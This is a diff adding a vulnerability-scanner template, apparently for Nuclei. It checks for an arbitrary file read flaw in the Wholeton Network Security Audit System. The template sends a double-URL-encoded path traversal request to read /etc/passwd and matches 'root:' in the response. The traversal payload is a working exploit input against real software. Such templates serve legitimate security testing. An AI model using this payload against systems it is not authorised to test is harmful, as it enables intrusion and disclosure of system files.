@@ -1,0 +1,25 @@
+id: wholeton-network-security-audit-system-anyfile-read
+info:
+  name: Wholeton Network Security Audit System Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
